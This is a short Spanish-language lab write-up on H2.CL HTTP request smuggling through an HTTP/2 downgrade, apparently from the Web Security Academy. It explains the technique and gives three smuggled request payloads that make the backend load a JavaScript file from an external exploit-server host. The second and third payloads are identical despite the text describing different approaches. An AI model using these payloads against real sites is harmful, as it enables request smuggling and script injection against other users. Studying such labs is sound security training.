---
title: "12 - H2.CL request smuggling"
---

# 12 - H2.CL request smuggling

La cosa aquí es que HTTP/2 separa en frames las conexiones y les asigna un length, por lo que no se puede explotar HTTP request smuggling, la única forma de hacerlo es con un downgrade.

Aprovechar un H2.CL significa que el frontend interpretará y medirá el content length usando la técnica que se usa en HTTP/2  y no entenderá Content-Length, cosa que si entenderá el backend, y así podemos spoofearlo para colarle otra petición al backend.

La cosa aquí es que se cargue un js de un dominio externo :

Esto puede que no funcione porque igual se añaden cabeceras duplicadas y producen fallos.

```HTTP
POST /test HTTP/2\r\n
Host: 0aa0003504478749805e305400be004e.web-security-academy.net\r\n
Content-Length: 0\r\n
\r\n
GET /exploit.js HTTP/1.1\r\n
Host: exploit-0ab500db040187c880912ff301020053.exploit-server.net\r\n
X-Ignore: X
```

Mejor hacerlo así a veces para el tema de las cabeceras duplicadas

```HTTP
POST /test HTTP/2\r\n
Host: 0aa0003504478749805e305400be004e.web-security-academy.net\r\n
Content-Length: 0\r\n
\r\n
GET /exploit.js HTTP/1.1\r\n
Host: exploit-0ab500db040187c880912ff301020053.exploit-server.net\r\n
Content-Length: 6\r\n

x=
```

Como no funcionaba hosteando un script, lo hice cargando el recurso de resources:

```HTTP
POST /test HTTP/2\r\n
Host: 0aa0003504478749805e305400be004e.web-security-academy.net\r\n
Content-Length: 0\r\n
\r\n
GET /exploit.js HTTP/1.1\r\n
Host: exploit-0ab500db040187c880912ff301020053.exploit-server.net\r\n
Content-Length: 6\r\n

x=
```
